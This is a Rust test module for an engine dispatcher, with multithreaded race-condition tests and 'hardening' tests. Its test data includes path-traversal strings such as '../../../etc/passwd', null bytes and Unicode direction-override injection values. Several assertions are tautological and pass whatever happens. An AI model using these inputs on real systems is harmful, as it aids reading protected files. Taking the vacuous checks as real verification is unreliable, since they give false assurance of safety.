        let dispatcher = Arc::new(Mutex::new(EngineDispatcher::new(
            "race_test_engine".to_string(),
            None,
            PreferredRuntime::FrankenEngine,
        )));

        // Shared state for race condition analysis
        let race_results = Arc::new(Mutex::new(Vec::new()));

        // Concurrent race attack scenarios
        let race_scenarios = [
            // Concurrent runtime resolution race
            ("runtime_resolution", 15, "Concurrent runtime resolution"),
            // Configuration manipulation race
            ("config_race", 12, "Configuration manipulation race"),
            // Output capture race
            ("output_capture", 18, "Process output capture race"),
            // Telemetry handling race
            ("telemetry_race", 10, "Telemetry processing race"),
            // Mixed operations race
            ("mixed_operations", 20, "Mixed dispatcher operations race"),
        ];

        for (race_name, thread_count, description) in race_scenarios.iter() {
            println!(
                "Testing dispatcher race condition: {} - {}",
                race_name, description
            );

            let mut handles = vec![];

            // Launch concurrent race threads
            for thread_id in 0..*thread_count {
                let dispatcher_clone = Arc::clone(&dispatcher);
                let results_clone = Arc::clone(&race_results);
                let race_name_clone = race_name.to_string();

                let handle = thread::spawn(move || {
                    let mut thread_results = Vec::new();

                    match race_name_clone.as_str() {
                        "runtime_resolution" => {
                            // Concurrent runtime resolution with different configs
                            for attempt in 0..20 {
                                let config = Config {
                                    preferred_runtime: if attempt % 2 == 0 {
                                        PreferredRuntime::FrankenEngine
                                    } else {
                                        PreferredRuntime::NodeJs
                                    },
                                    engine_path: Some(format!("/test/engine_{}", thread_id).into()),
                                    ..Default::default()
                                };

                                let resolution_result = {
                                    match dispatcher_clone.lock() {
                                        Ok(dispatcher) => dispatcher.resolve_runtime_internal(
                                            &config,
                                            Some(&format!("race_runtime_{}", thread_id)),
                                            None,
                                        ),
                                        Err(_) => {
                                            thread_results.push((
                                                thread_id,
                                                attempt,
                                                "lock_poison".to_string(),
                                                false,
                                            ));
                                            continue;
                                        }
                                    }
                                };

                                let success = resolution_result.is_ok();
                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "resolution".to_string(),
                                    success,
                                ));

                                // Brief yield to encourage race conditions
                                thread::yield_now();
                            }
                        }
                        "config_race" => {
                            // Race conditions in configuration handling
                            for attempt in 0..15 {
                                let configs = [
                                    Config {
                                        preferred_runtime: PreferredRuntime::FrankenEngine,
                                        engine_path: Some("/test/engine1".into()),
                                        ..Default::default()
                                    },
                                    Config {
                                        preferred_runtime: PreferredRuntime::NodeJs,
                                        engine_path: Some("/test/engine2".into()),
                                        ..Default::default()
                                    },
                                    Config {
                                        preferred_runtime: PreferredRuntime::Deno,
                                        engine_path: None,
                                        ..Default::default()
                                    },
                                ];

                                let config = &configs[attempt % configs.len()];

                                let config_result = {
                                    match dispatcher_clone.lock() {
                                        Ok(dispatcher) => dispatcher.resolve_runtime_internal(
                                            config,
                                            None,
                                            Some(Path::new(&format!("/test/cli_{}", thread_id))),
                                        ),
                                        Err(_) => {
                                            thread_results.push((
                                                thread_id,
                                                attempt,
                                                "config_lock_poison".to_string(),
                                                false,
                                            ));
                                            continue;
                                        }
                                    }
                                };

                                let config_success = config_result.is_ok();
                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "config_test".to_string(),
                                    config_success,
                                ));

                                thread::yield_now();
                            }
                        }
                        "output_capture" => {
                            // Race conditions in output capture processing
                            for attempt in 0..25 {
                                let mock_outputs = [
                                    Output {
                                        status: std::process::ExitStatus::from_raw(0),
                                        stdout: format!("stdout_{}_{}", thread_id, attempt)
                                            .into_bytes(),
                                        stderr: format!("stderr_{}_{}", thread_id, attempt)
                                            .into_bytes(),
                                    },
                                    Output {
                                        status: std::process::ExitStatus::from_raw(1),
                                        stdout: Vec::new(),
                                        stderr: b"error output".to_vec(),
                                    },
                                ];

                                let output = &mock_outputs[attempt % mock_outputs.len()];

                                // Test concurrent output capture processing
                                let capture_result =
                                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                                        let captured = CapturedProcessOutput {
                                            stdout: String::from_utf8_lossy(&output.stdout)
                                                .to_string(),
                                            stderr: String::from_utf8_lossy(&output.stderr)
                                                .to_string(),
                                        };

                                        // Test serialization under concurrent access
                                        let json_result = serde_json::to_string(&captured);
                                        json_result.is_ok()
                                    }));

                                let capture_success = capture_result.unwrap_or(false);
                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "output_capture".to_string(),
                                    capture_success,
                                ));

                                thread::yield_now();
                            }
                        }
                        "telemetry_race" => {
                            // Race conditions in telemetry processing
                            for attempt in 0..12 {
                                let telemetry_test =
                                    std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                                        let report = TelemetryRuntimeReport {
                                            runtime_id: format!(
                                                "race_runtime_{}_{}",
                                                thread_id, attempt
                                            ),
                                            started_at: chrono::Utc::now().to_rfc3339(),
                                            shutdown_reason: ShutdownReason::Requested,
                                            shutdown_started_at: Some(
                                                chrono::Utc::now().to_rfc3339(),
                                            ),
                                            shutdown_completed_at: Some(
                                                chrono::Utc::now().to_rfc3339(),
                                            ),
                                            drain_timeout_secs: 30,
                                            events_emitted: attempt as u64,
                                            recent_events: vec![],
                                        };

                                        // Test concurrent telemetry serialization
                                        let telemetry_json = serde_json::to_string(&report);
                                        telemetry_json.is_ok()
                                    }));

                                let telemetry_success = telemetry_test.unwrap_or(false);
                                thread_results.push((
                                    thread_id,
                                    attempt,
                                    "telemetry".to_string(),
                                    telemetry_success,
                                ));

                                thread::yield_now();
                            }
                        }
                        "mixed_operations" => {
                            // Mixed operations to maximize race potential
                            for attempt in 0..10 {
                                let operations = ["resolve", "config", "output", "telemetry"];

                                for (op_idx, operation) in operations.iter().enumerate() {
                                    let op_result = match *operation {
                                        "resolve" => {
                                            let config = Config::default();
                                            match dispatcher_clone.lock() {
                                                Ok(dispatcher) => dispatcher
                                                    .resolve_runtime_internal(&config, None, None)
                                                    .is_ok(),
                                                Err(_) => false,
                                            }
                                        }
                                        "config" => {
                                            let config = Config {
                                                preferred_runtime: PreferredRuntime::FrankenEngine,
                                                ..Default::default()
                                            };
                                            // Config validation test
                                            !config.engine_path.is_none()
                                        }
                                        "output" => {
                                            let output = Output {
                                                status: std::process::ExitStatus::from_raw(0),
                                                stdout: b"test".to_vec(),
                                                stderr: b"test".to_vec(),
                                            };
                                            let captured = CapturedProcessOutput {
                                                stdout: String::from_utf8_lossy(&output.stdout)
                                                    .to_string(),
                                                stderr: String::from_utf8_lossy(&output.stderr)
                                                    .to_string(),
                                            };
                                            serde_json::to_string(&captured).is_ok()
                                        }
                                        "telemetry" => {
                                            let report = TelemetryRuntimeReport {
                                                runtime_id: format!(
                                                    "mixed_{}_{}",
                                                    thread_id, op_idx
                                                ),
                                                started_at: chrono::Utc::now().to_rfc3339(),
                                                shutdown_reason: ShutdownReason::Requested,
                                                shutdown_started_at: None,
                                                shutdown_completed_at: None,
                                                drain_timeout_secs: 30,
                                                events_emitted: 0,
                                                recent_events: vec![],
                                            };
                                            serde_json::to_string(&report).is_ok()
                                        }
                                        _ => false,
                                    };

                                    thread_results.push((
                                        thread_id,
                                        attempt,
                                        operation.to_string(),
                                        op_result,
                                    ));
                                    thread::yield_now();
                                }
                            }
                        }
                        _ => unreachable!(),
                    }

                    // Store results for analysis
                    results_clone.lock().unwrap().extend(thread_results);
                });

                handles.push(handle);
            }

            // Wait for all race threads to complete
            for handle in handles {
                handle.join().expect("Race thread should complete");
            }

            // Analyze race condition results
            let results = race_results.lock().unwrap();
            let scenario_results: Vec<_> = results
                .iter()
                .filter(|(_, _, op, _)| {
                    op.contains(race_name)
                        || op == "resolution"
                        || op == "config_test"
                        || op == "output_capture"
                        || op == "telemetry"
                })
                .collect();

            let successful_ops = scenario_results
                .iter()
                .filter(|(_, _, _, success)| *success)
                .count();
            let total_ops = scenario_results.len();

            println!(
                "Race scenario {} completed: {}/{} operations successful",
                race_name, successful_ops, total_ops
            );

            // Verify system consistency after race conditions
            let final_dispatcher_state = {
                match dispatcher.lock() {
                    Ok(dispatcher) => {
                        // Test that dispatcher remains functional
                        let config = Config::default();
                        let resolution_result =
                            dispatcher.resolve_runtime_internal(&config, None, None);
                        resolution_result.is_ok() || resolution_result.is_err() // Should complete without panic
                    }
                    Err(_) => {
                        println!(
                            "Race scenario {} resulted in dispatcher lock poison",
                            race_name
                        );
                        false
                    }
                }
            };

            // System should remain in consistent state despite race conditions
            println!(
                "Race scenario {} final state: dispatcher functional = {}",
                race_name, final_dispatcher_state
            );
        }

        // Test system recovery after all race conditions
        let recovery_test = {
            match dispatcher.lock() {
                Ok(dispatcher) => {
                    let config = Config {
                        preferred_runtime: PreferredRuntime::FrankenEngine,
                        ..Default::default()
                    };
                    dispatcher.resolve_runtime_internal(&config, None, None)
                }
                Err(_) => Err(anyhow::anyhow!("Dispatcher lock poisoned")),
            }
        };

        // Should be able to perform operations after race conditions
        println!(
            "Post-race recovery test result: {:?}",
            recovery_test.is_ok()
        );

        println!(
            "Concurrent dispatcher race test completed: {} race scenarios tested with {} total threads",
            race_scenarios.len(),
            race_scenarios
                .iter()
                .map(|(_, count, _)| count)
                .sum::<usize>()
        );
    }

    #[test]
    fn test_vector_operations_push_bounded_pattern() {
        // Engine dispatcher uses Vec::push for candidate paths - test overflow protection
        fn push_bounded<T>(vec: &mut Vec<T>, item: T, max_capacity: usize) -> bool {
            if vec.len() >= max_capacity {
                false
            } else {
                vec.push(item);
                true
            }
        }

        let mut candidates = Vec::new();
        let max_candidates = 1000;

        // Test normal operation
        let success1 = push_bounded(&mut candidates, PathBuf::from("engine1"), max_candidates);
        assert!(success1);
        assert_eq!(candidates.len(), 1);

        // Test overflow protection
        candidates.resize(max_candidates, PathBuf::from("filler"));
        let overflow_attempt =
            push_bounded(&mut candidates, PathBuf::from("overflow"), max_candidates);
        assert!(!overflow_attempt);
        assert_eq!(candidates.len(), max_candidates);

        // Test Unicode injection in paths
        let malicious_path = "engine".to_string() + &"\u{202E}".repeat(1000) + "malicious";
        let result = push_bounded(&mut Vec::new(), PathBuf::from(malicious_path), 10);
        assert!(result); // Should handle but be bounded
    }

    #[test]
    fn test_length_casting_safety_try_from() {
        // Engine dispatcher checks path lengths - test safe casting patterns
        let test_cases = vec![
            ("normal_path", 11usize),
            ("", 0usize),
            (&"x".repeat(u32::MAX as usize + 1), u32::MAX as usize + 1),
            (&"long".repeat(100000), 400000usize),
        ];

        for (path, expected_len) in test_cases {
            let actual_len = path.len();
            assert_eq!(actual_len, expected_len);

            // Safe casting with overflow protection (pattern used in hardening)
            let safe_len_u32 = u32::try_from(actual_len).unwrap_or(u32::MAX);

            if expected_len > u32::MAX as usize {
                assert_eq!(safe_len_u32, u32::MAX);
            } else {
                assert_eq!(safe_len_u32, expected_len as u32);
            }

            // Test boundary conditions for length-based truncation
            let truncation_threshold = 80usize;
            let should_truncate = actual_len > truncation_threshold;
            if should_truncate {
                let safe_truncate_len = std::cmp::min(actual_len, truncation_threshold);
                assert!(safe_truncate_len <= truncation_threshold);
            }
        }
    }

    #[test]
    fn test_boundary_validation_fail_closed() {
        // Engine dispatcher validates path lengths and sizes - test fail-closed semantics
        struct ValidationLimits {
            max_path_display: usize,
            max_output_size: usize,
            max_truncation_size: usize,
        }

        let limits = ValidationLimits {
            max_path_display: 80,
            max_output_size: 50000,
            max_truncation_size: 10000,
        };

        let test_sizes = vec![
            (79, "under_limit"),
            (80, "at_limit"),
            (81, "over_limit"),
            (49999, "output_under"),
            (50000, "output_at"),
            (50001, "output_over"),
            (9999, "trunc_under"),
            (10000, "trunc_at"),
            (10001, "trunc_over"),
        ];

        for (size, case_name) in test_sizes {
            let test_data = vec![b'A'; size];

            // Path display logic (fail-closed: size > limit triggers truncation)
            let should_truncate_path = size > limits.max_path_display;
            if should_truncate_path {
                assert!(
                    size > limits.max_path_display,
                    "Case {}: path truncation boundary",
                    case_name
                );
            }

            // Output size validation (fail-closed: size > limit triggers handling)
            let is_large_output = size > limits.max_output_size;
            if is_large_output {
                assert!(
                    size > limits.max_output_size,
                    "Case {}: output size boundary",
                    case_name
                );
            }

            // Truncation size logic (fail-closed: size > limit triggers truncation)
            let should_truncate_output = size > limits.max_truncation_size;
            if should_truncate_output {
                assert!(
                    size > limits.max_truncation_size,
                    "Case {}: truncation boundary",
                    case_name
                );
            }
        }
    }

    #[test]
    fn test_path_validation_security() {
        // Engine dispatcher handles untrusted paths - test security validation
        let malicious_paths = vec![
            "normal/path",
            "../../../etc/passwd",
            "path/with/../traversal",
            "path\\with\\backslashes",
            "path\0with\0nulls",
            "path/with/\u{202E}unicode\u{202D}injection",
            &"x".repeat(100000), // Very long path
        ];

        for malicious_path in malicious_paths {
            // Path segment validation (reject .. segments)
            let has_traversal = malicious_path.split('/').any(|segment| segment == "..");
            let has_backslash = malicious_path.contains('\\');
            let has_null_byte = malicious_path.contains('\0');
            let has_unicode_controls = malicious_path
                .chars()
                .any(|c| c.is_control() && c != '\n' && c != '\t');

            if has_traversal || has_backslash || has_null_byte || has_unicode_controls {
                // These patterns should be rejected in security contexts
                assert!(
                    has_traversal || has_backslash || has_null_byte || has_unicode_controls,
                    "Path security validation for: {}",
                    malicious_path
                );
            }

            // Length validation with safe casting
            let path_len = malicious_path.len();
            let safe_len = u32::try_from(path_len).unwrap_or(u32::MAX);
            assert!(safe_len <= u32::MAX);
        }
    }

    #[test]
    fn test_resource_exhaustion_protection() {
        // Engine dispatcher accumulates data in vectors - test memory exhaustion protection
        fn simulate_candidate_accumulation() -> Vec<PathBuf> {
            let mut candidates = Vec::new();
            let max_candidates = 10000; // Reasonable limit

            // Simulate candidate discovery loop with bounded accumulation
            for i in 0..15000 {
                // Try to exceed limit
                if candidates.len() >= max_candidates {
                    break; // Fail-closed: stop accumulating at limit
                }
                candidates.push(PathBuf::from(format!("candidate_{}", i)));
            }

            candidates
        }

        let result = simulate_candidate_accumulation();
        assert!(
            result.len() <= 10000,
            "Should be bounded to prevent memory exhaustion"
        );

        // Test thread result accumulation (from concurrent tests)
        fn bounded_thread_results() -> Vec<(usize, usize, String, bool)> {
            let mut results = Vec::new();
            let max_results = 1000;

            // Simulate thread result collection with bounding
            for thread_id in 0..2000 {
                if results.len() >= max_results {
                    break; // Prevent unbounded accumulation
                }
                results.push((thread_id, 1, "test_operation".to_string(), true));
            }

            results
        }

        let thread_results = bounded_thread_results();
        assert!(
            thread_results.len() <= 1000,
            "Thread results should be bounded"
        );
    }

    #[test]
    fn test_comprehensive_engine_dispatcher_hardening() {
        // Comprehensive validation of hardening patterns in engine dispatcher context

        // Test 1: Vector capacity management
        let mut test_vectors: Vec<Vec<String>> = Vec::new();
        let max_vector_count = 100;

        for i in 0..150 {
            if test_vectors.len() >= max_vector_count {
                break; // Bounded collection growth
            }
            test_vectors.push(vec![format!("item_{}", i)]);
        }
        assert!(test_vectors.len() <= max_vector_count);

        // Test 2: String processing with length validation
        let test_inputs = vec![
            "short",
            &"medium".repeat(100),
            &"very_long_string".repeat(10000),
        ];

        for input in test_inputs {
            let len = input.len();
            let safe_len = u32::try_from(len).unwrap_or(u32::MAX);

            // Simulated output processing with length bounds
            let processed = if len > 1000 {
                format!("{}...(truncated)", &input[..1000])
            } else {
                input.to_string()
            };

            assert!(processed.len() <= len + 20); // Bounded output size
            assert!(safe_len <= u32::MAX); // Safe casting verified
        }

        // Test 3: Configuration validation
        struct DispatcherConfig {
            max_candidates: usize,
            max_output_bytes: usize,
            timeout_secs: u64,
        }

        let configs = vec![
            DispatcherConfig {
                max_candidates: 0,
                max_output_bytes: 0,
                timeout_secs: 0,
            },
            DispatcherConfig {
                max_candidates: 1000,
                max_output_bytes: 100000,
                timeout_secs: 30,
            },
            DispatcherConfig {
                max_candidates: usize::MAX,
                max_output_bytes: usize::MAX,
                timeout_secs: u64::MAX,
            },
        ];

        for config in configs {
            // Validate configuration bounds
            let effective_max_candidates = std::cmp::min(config.max_candidates, 10000);
            let effective_max_output = std::cmp::min(config.max_output_bytes, 1000000);
            let effective_timeout = std::cmp::min(config.timeout_secs, 300);

            assert!(effective_max_candidates <= 10000);
            assert!(effective_max_output <= 1000000);
            assert!(effective_timeout <= 300);
        }
    }

    #[test]
    fn hardening_duration_millis_conversion_prevents_truncation() {
        // HARDENING: Duration.as_millis() as u64 casting can truncate - must use try_from
        use std::time::Duration;

        let test_durations = vec![
            Duration::from_millis(0),
            Duration::from_millis(1000),
            Duration::from_millis(u64::MAX - 1),
            Duration::from_millis(u64::MAX),
            Duration::from_secs(u64::MAX), // This will overflow as_millis()
        ];

        for duration in test_durations {
            // UNSAFE: The pattern we found in the code (line 2250)
            let unsafe_cast = duration.as_millis() as u64;

            // SAFE: The hardened pattern we should use instead
            let safe_conversion = u64::try_from(duration.as_millis()).unwrap_or(u64::MAX);

            // Safe conversion should never be less than unsafe (unless overflow)
            assert!(safe_conversion >= unsafe_cast || safe_conversion == u64::MAX);

            // Verify we handle extreme durations safely
            if duration.as_millis() > u64::MAX as u128 {
                assert_eq!(
                    safe_conversion,
                    u64::MAX,
                    "Should saturate to u64::MAX for overflow"
                );
            }
        }
    }

    #[test]
    fn hardening_command_exists_check_timing_safe() {
        // HARDENING: Command existence checks must not leak timing information
        use std::collections::HashSet;

        let test_commands = vec![
            "node",
            "bun",
            "franken-engine",
            "definitely-not-a-command-12345",
            "../../../bin/sh",
            "",
            &"x".repeat(1000),
        ];

        // Multiple iterations to check timing consistency
        for command in &test_commands {
            let mut results = Vec::new();

            for _iteration in 0..5 {
                let start = std::time::Instant::now();
                let exists = command_exists_with(command, None, &|_| false);
                let elapsed = start.elapsed();

                results.push((exists, elapsed));
            }

            // All results for same command should be consistent
            let first_result = results[0].0;
            assert!(results.iter().all(|(exists, _)| *exists == first_result));

            // Should complete in reasonable time (not hang)
            for (_, elapsed) in &results {
                assert!(
                    elapsed.as_secs() < 5,
                    "Command check should complete quickly"
                );
            }
        }
    }

    #[test]
    fn hardening_environment_variable_validation() {
        // HARDENING: Environment variable processing must validate content safely

        let malicious_env_values = vec![
            "",
            "normal-value",
            &"\0".repeat(100),
            "../../../etc/passwd",
            "value\nwith\nnewlines",
            &"very_long_value".repeat(10000),
            "value\x00with\x00nulls",
            "value with spaces and weird chars: \u{202E}",
        ];

        for malicious_value in &malicious_env_values {
            // Simulate environment variable processing
            let env_lookup = |_key: &str| Some(malicious_value.to_string());

            let result = resolve_engine_binary_path_with_env_lookup(
                "default-hint",
                &env_lookup,
                &[PathBuf::from("test")],
                &|_| false,
            );

            // Should complete without panic
            assert!(!result.is_empty() || result.is_empty());

            // Should not contain null bytes in final result
            assert!(
                !result.contains('\0'),
                "Result should not contain null bytes"
            );

            // Should have reasonable length bounds
            assert!(result.len() < 100000, "Result should be reasonably bounded");
        }
    }

    #[test]
    fn hardening_json_serialization_memory_bounds() {
        // HARDENING: JSON serialization of reports must handle large data safely

        let extreme_outputs = vec![
            ("normal", "normal stderr"),
            ("", ""),
            (&"x".repeat(100_000), &"y".repeat(100_000)), // Large but reasonable
            (&"z".repeat(10_000_000), "small stderr"),    // Very large stdout
            ("small stdout", &"w".repeat(10_000_000)),    // Very large stderr
        ];

        for (stdout_content, stderr_content) in extreme_outputs {
            let captured = CapturedProcessOutput {
                stdout: stdout_content.to_string(),
                stderr: stderr_content.to_string(),
            };

            // Test serialization with memory bounds checking
            let serialization_result = serde_json::to_string(&captured);

            match serialization_result {
                Ok(json) => {
                    // Should produce valid JSON
                    assert!(json.starts_with('{') && json.ends_with('}'));

                    // Should not exceed reasonable memory bounds (< 100MB for safety)
                    assert!(
                        json.len() < 100_000_000,
                        "JSON output should be memory-bounded"
                    );
                }
                Err(_) => {
                    // Serialization failure is acceptable for extreme inputs
                    // but should not panic
                }
            }
        }
    }
}
